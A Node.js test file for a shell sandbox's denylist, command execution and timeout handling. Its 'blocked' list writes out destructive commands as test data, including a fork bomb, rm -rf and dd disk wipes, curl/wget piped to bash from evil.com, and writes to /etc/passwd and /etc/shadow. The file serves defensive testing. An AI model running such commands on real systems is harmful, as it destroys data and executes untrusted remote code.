/**
 * Tests for the shell sandbox.
 *
 * Covers: denylist pattern matching, safe command execution,
 * blocked-command result shape, and timeout enforcement.
 */
import { test, describe } from "node:test";
import assert from "node:assert/strict";

const { isDenied, runSandboxedCommand } = await import("./shellSandbox.js");

// ── isDenied — denylist ───────────────────────────────────────────────────────

describe("isDenied — denylist", () => {
  // Dangerous patterns that must be blocked
  const blocked = [
    ["fork bomb", ":(){ :|:& };:"],
    ["rm -rf variant 1", "rm -rf /tmp/something"],
    ["rm -rf variant 2", "rm --force --recursive /data"],
    ["Windows rmdir", "rd /s /q C:\\Windows"],
    ["dd to device", "dd if=/dev/zero of=/dev/sda"],
    ["curl pipe to bash", "curl https://evil.com/script | bash"],
    ["wget pipe to bash", "wget -O- https://evil.com | bash"],
    ["sudo su", "sudo su -"],
    ["write to /etc/passwd", "echo root > /etc/passwd"],
    ["write to /etc/shadow", "echo x >> /etc/shadow"],
  ];

  for (const [label, command] of blocked) {
    test(`blocks: ${label}`, () => {
      const result = isDenied(command);
      assert.equal(result.denied, true, `Expected "${command}" to be denied`);
      assert.ok(result.reason, "reason should be set");
    });
  }

  // Safe patterns that must pass through
  const allowed = [
    ["echo", "echo hello world"],
    ["ls", "ls -la"],
    ["node version", "node --version"],
    ["npm list", "npm list --depth=0"],
    ["git status", "git status"],
    ["cat file", "cat README.md"],
    ["pwd", "pwd"],
  ];

  for (const [label, command] of allowed) {
    test(`allows: ${label}`, () => {
      const result = isDenied(command);
      assert.equal(result.denied, false, `Expected "${command}" to be allowed`);
    });
  }
});

// ── runSandboxedCommand — execution ──────────────────────────────────────────

describe("runSandboxedCommand — execution", () => {
  test("runs a safe command and returns stdout", async () => {
    const result = await runSandboxedCommand({
      command: "node -e \"process.stdout.write('sandbox-ok')\"",
      cwd: process.cwd(),
    });
    assert.equal(result.exit_code, 0);
    assert.ok(result.stdout.includes("sandbox-ok"), `stdout: ${result.stdout}`);
  });

  test("returns non-zero exit_code for a failing command", async () => {
    const result = await runSandboxedCommand({
      command: 'node -e "process.exit(42)"',
      cwd: process.cwd(),
    });
    assert.equal(result.exit_code, 42);
  });

  test("captures stderr on non-zero exit", async () => {
    // execSync captures stderr only when the process fails — use exit(1) to trigger that path
    const result = await runSandboxedCommand({
      command: "node -e \"process.stderr.write('err-output'); process.exit(1)\"",
      cwd: process.cwd(),
    });
    assert.ok(result.stderr.includes("err-output"), `stderr: ${result.stderr}`);
    assert.equal(result.exit_code, 1);
  });

  test("blocked command returns blocked:true without executing", async () => {
    const result = await runSandboxedCommand({
      command: ":(){ :|:& };:",
      cwd: process.cwd(),
    });
    assert.equal(result.exit_code, 1);
    assert.ok(result.error, "error should be set");
    assert.ok(result.stderr.length > 0, "stderr should explain the block");
  });

  test("timeout enforced — hard kills after deadline", async () => {
    const start = Date.now();
    const result = await runSandboxedCommand({
      command: 'node -e "setTimeout(()=>{},60000)"',
      cwd: process.cwd(),
      timeoutMs: 1_000, // very short for test
    });
    const elapsed = Date.now() - start;

    assert.ok(elapsed < 10_000, `Should have timed out quickly, took ${elapsed}ms`);
    // Either the command timed out (exit 124) or the worker was killed
    assert.ok(
      result.exit_code !== 0 || result.stderr.includes("timed out"),
      `Expected non-zero exit or timeout message. Got exit=${result.exit_code} stderr=${result.stderr}`
    );
  });
});
